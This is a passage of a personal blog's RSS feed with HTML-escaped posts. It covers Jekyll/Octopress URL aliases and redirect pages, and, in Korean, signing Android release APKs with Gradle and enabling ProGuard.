&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;s&quot;&gt;redirect_from&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/path/to/alias/&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/path/to/another/alias&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can also specify just one url:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;s&quot;&gt;redirect_from&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/path/to/alias/&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note that &lt;code&gt;/path/to/alias/&lt;/code&gt; will generate a &lt;code&gt;/path/to/alias/index.html&lt;/code&gt;, while &lt;code&gt;/path/to/alias&lt;/code&gt; will generate a &lt;code&gt;/path/to/alias&lt;/code&gt;.&lt;/p&gt;
</description>
        <pubDate>Wed, 09 Jul 2014 15:41:31 +0900</pubDate>
        <link>http://yous.be/2014/07/09/move-to-jekyll-redirect-from/</link>
        <guid isPermaLink="true">http://yous.be/2014/07/09/move-to-jekyll-redirect-from/</guid>
        
        
        <category>Octopress</category>
        
      </item>
    
      <item>
        
        <title>How to Add Redirects to Post URL on Octopress</title>
        
        <description>&lt;p&gt;When I write a new post on &lt;a href=&quot;http://octopress.org&quot;&gt;Octopress&lt;/a&gt;, I share the link of it to somewhere doesn&amp;rsquo;t support &lt;a href=&quot;http://en.wikipedia.org/wiki/Hyperlink&quot;&gt;hyperlinks&lt;/a&gt;. Since people can&amp;rsquo;t click the link, they should copy and paste or just type it letter by letter. I wanted to make it easier, so I maded short url for every post.&lt;/p&gt;

&lt;h2&gt;&lt;a id=&quot;alias-generator-for-posts&quot;&gt;&lt;/a&gt;Alias Generator for Posts&lt;/h2&gt;

&lt;p&gt;There is a &lt;a href=&quot;http://jekyllrb.com&quot;&gt;Jekyll&lt;/a&gt; plugin that &lt;a href=&quot;https://github.com/tsmango/jekyll_alias_generator&quot;&gt;generates redirect pages for posts with aliases&lt;/a&gt;. Octopress is based on Jekyll and this plugin has no compatibility problem. Its source is on GitHub, so I just added it as submodule:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;git submodule add git@github.com:tsmango/jekyll_alias_generator plugins/jekyll_alias_generator
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In your &lt;code&gt;_config.yml&lt;/code&gt;, you may have this line:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;s&quot;&gt;plugins&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;plugins&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then it reads &lt;code&gt;plugins&lt;/code&gt; directory and &lt;code&gt;alias_generator.rb&lt;/code&gt; in &lt;code&gt;plugins/jekyll_alias_generator/_plugins/&lt;/code&gt; directory is also loaded, so you can use and manage it!&lt;/p&gt;

&lt;h2&gt;&lt;a id=&quot;how-to-use&quot;&gt;&lt;/a&gt;How to Use&lt;/h2&gt;

&lt;p&gt;This plugin checks &lt;code&gt;alias&lt;/code&gt; inside every post&amp;rsquo;s YAML Front Matter. Just place the path of the alias:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;layout&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;post&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;How&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Redirects&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Post&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Octopress&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;alias&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/p/20140523&lt;/span&gt;
&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Multiple aliases are also available:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;layout&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;post&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;How&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Redirects&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Post&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Octopress&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;alias&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;/one-alias/index.html&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/another-alias/index.html&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;When I &lt;code&gt;rake generate&lt;/code&gt;, the plugin generates static html file at &lt;code&gt;/p/20140523/index.html&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;canonical&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/2014/05/23/how-to-add-redirects-to-post-url-on-octopress/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content-type&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/html; charset=utf-8&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;refresh&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0;url=/2014/05/23/how-to-add-redirects-to-post-url-on-octopress/&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;When you go to &lt;a href=&quot;/p/20140523&quot;&gt;/p/20140523&lt;/a&gt;, it will redirect here. It also has &lt;a href=&quot;http://en.wikipedia.org/wiki/Canonical_link_element&quot;&gt;canonical link&lt;/a&gt;, so it won&amp;rsquo;t affect search engine or web analysis services.&lt;/p&gt;
</description>
        <pubDate>Fri, 23 May 2014 14:56:44 +0900</pubDate>
        <link>http://yous.be/2014/05/23/how-to-add-redirects-to-post-url-on-octopress/</link>
        <guid isPermaLink="true">http://yous.be/2014/05/23/how-to-add-redirects-to-post-url-on-octopress/</guid>
        
        
        <category>Octopress</category>
        
      </item>
    
      <item>
        
        <title>Gradle 환경에서 ProGuard 사용하기</title>
        
        <description>&lt;h2&gt;&lt;a id=&quot;gradle&quot;&gt;&lt;/a&gt;Gradle&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;http://www.gradle.org/img/gradle_logo.gif&quot; alt=&quot;Gradle&quot; title=&quot;Gradle&quot;&gt;&lt;/p&gt;

&lt;p&gt;최근 &lt;a href=&quot;http://developer.android.com/sdk/installing/studio.html&quot;&gt;Android Studio&lt;/a&gt;를 통해 개발을 진행하게 되면서, 자연스럽게 &lt;a href=&quot;http://www.gradle.org&quot;&gt;Gradle&lt;/a&gt;을 사용하게 되었다. &lt;code&gt;.gradle&lt;/code&gt; 확장자를 가진 파일을 통해 빌드 설정을 자유롭게 조정할 수 있다. 이 글에서는 Gradle을 이용해 배포 APK를 생성하는 방법과 함께 &lt;a href=&quot;http://proguard.sourceforge.net&quot;&gt;ProGuard&lt;/a&gt;를 사용법을 공유하겠다.&lt;/p&gt;

&lt;h2&gt;&lt;a id=&quot;how-to-create-release-apk-using-gradle&quot;&gt;&lt;/a&gt;Gradle 환경에서 배포 APK 생성하기&lt;/h2&gt;

&lt;p&gt;배포 APK에는 서명이 되어 있어야 하는데, 이를 위해서는 keystore 파일과 그 암호, 키 별칭, 키 암호가 필요하다. 디버그 APK에도 서명을 하지만, &lt;a href=&quot;http://developer.android.com/tools/publishing/app-signing.html#debugmode&quot;&gt;알려진 keystore 암호와 키 별칭, 키 암호&lt;/a&gt;를 사용한다. 배포 APK의 서명을 위해 프로젝트의 &lt;code&gt;build.gradle&lt;/code&gt; 파일에 다음 코드를 추가하면 된다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-groovy&quot; data-lang=&quot;groovy&quot;&gt;&lt;span class=&quot;n&quot;&gt;android&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ...
&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;signingConfigs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;release&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;storeFile&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;YOUR_KEYSTORE_PATH&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;storePassword&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;YOUR_KEYSTORE_PASSWORD&quot;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;keyAlias&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;YOUR_KEY_ALIAS&quot;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;keyPassword&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;YOUR_KEY_PASSWORD&quot;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;buildTypes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;release&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;signingConfig&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signingConfigs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;release&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이때 &lt;code&gt;buildTypes&lt;/code&gt; 아래의 &lt;code&gt;debug&lt;/code&gt; 항목은 굳이 명시하지 않아도 &lt;a href=&quot;http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Build-Types&quot;&gt;기본적으로 생성&lt;/a&gt;되며, 이 &lt;code&gt;buildType&lt;/code&gt;은 &lt;a href=&quot;http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Signing-Configurations&quot;&gt;디버그 keystore와 키를 사용하도록 설정&lt;/a&gt;되어 있다.&lt;/p&gt;

&lt;p&gt;다만 이 때 &lt;code&gt;build.gradle&lt;/code&gt; 파일에 keystore 암호와 키 암호가 평문으로 들어가게 되는데, 소스를 공개하고 있는 등의 이유로 이를 피하고 싶다면 각각의 항목을 쉘 프롬프트에서 입력받을 수 있다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-groovy&quot; data-lang=&quot;groovy&quot;&gt;&lt;span class=&quot;n&quot;&gt;signingConfigs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;release&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;storeFile&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;\n\$ Enter keystore path: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;storePassword&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readPassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;\n\$ Enter keystore password: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;keyAlias&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;\n\$ Enter key alias: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;keyPassword&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readPassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;\n\$ Enter key password: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그러나 이는 &lt;a href=&quot;http://stackoverflow.com/questions/18328730/how-to-create-a-release-signed-apk-file-using-gradle#19210105&quot;&gt;IDE를 통해 디버그 APK를 생성할 때 크래시&lt;/a&gt;를 내며, 이는 그때 코드의 &lt;code&gt;console&lt;/code&gt;이 &lt;code&gt;null&lt;/code&gt;이라서 발생하는 오류다. 이를 해결한 최종 코드는 다음과 같다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-groovy&quot; data-lang=&quot;groovy&quot;&gt;&lt;span class=&quot;n&quot;&gt;signingConfigs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;release&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Console&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;console&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;console&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;storeFile&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;\n\$ Enter keystore path: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;storePassword&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readPassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;\n\$ Enter keystore password: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;keyAlias&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;\n\$ Enter key alias: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;keyPassword&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readPassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;\n\$ Enter key password: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;디버그 APK와 배포 APK의 패키지 이름이 같으면 APK의 서명이 서로 달라 개발과 디버깅에 어려움이 있다. 이를 해결하기 위해서 &lt;code&gt;buildTypes&lt;/code&gt; 아래에 &lt;code&gt;debug&lt;/code&gt; 항목을 선언하여 디버그 APK의 패키지 이름을 바꿀 수 있고, 추가로 버전명도 바꿀 수 있다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-groovy&quot; data-lang=&quot;groovy&quot;&gt;&lt;span class=&quot;n&quot;&gt;buildTypes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;debug&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;packageNameSuffix&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;.debug&#39;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;versionNameSuffix&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;-debug&#39;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이제 터미널에서 다음 명령을 실행하면 디버그 APK와 배포 APK를 각각 얻을 수 있다. 물론 디버그 APK는 IDE로도 생성할 수 있다.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;./gradlew assembleDebug
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;./gradlew assembleRelease
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Gradle은 &lt;a href=&quot;http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Android-tasks&quot;&gt;캐멀케이스 단축키를 지원&lt;/a&gt;해서 &lt;code&gt;aR&lt;/code&gt;에 해당하는 다른 명령이 없는 한 &lt;code&gt;assembleRelease&lt;/code&gt; 대신 &lt;code&gt;aR&lt;/code&gt;을 사용할 수 있다.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2&gt;&lt;a id=&quot;how-to-use-proguard&quot;&gt;&lt;/a&gt;ProGuard 사용하기&lt;/h2&gt;

&lt;p&gt;배포 APK를 생성할 때 ProGuard를 사용할 수도 있는데, &lt;code&gt;build.gradle&lt;/code&gt;에 다음 코드를 추가하면 된다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-groovy&quot; data-lang=&quot;groovy&quot;&gt;&lt;span class=&quot;n&quot;&gt;buildTypes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;release&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;runProguard&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;proguardFile&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getDefaultProguardFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;proguard-android.txt&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;getDefaultProguardFile()&lt;/code&gt;는 &lt;a href=&quot;http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Running-ProGuard&quot;&gt;SDK에 위치한 해당 이름의 파일을 가져와 적용&lt;/a&gt;한다. &lt;code&gt;proguard-android.txt&lt;/code&gt;와 &lt;code&gt;proguard-android-optimize.txt&lt;/code&gt;가 있으며 &lt;a href=&quot;http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Running-ProGuard&quot;&gt;앞의 것은 최적화를 수행하지 않고, 뒤의 것은 최적화를 수행&lt;/a&gt;한다.&lt;/p&gt;

&lt;p&gt;추가적인 다른 &lt;code&gt;proguardFile&lt;/code&gt;을 더 적용하고 싶다면 &lt;code&gt;proguardFiles&lt;/code&gt;를 사용하면 된다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-groovy&quot; data-lang=&quot;groovy&quot;&gt;&lt;span class=&quot;n&quot;&gt;buildTypes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;release&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;runProguard&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;proguardFiles&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getDefaultProguardFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;proguard-android.txt&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;proguard-project.txt&#39;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
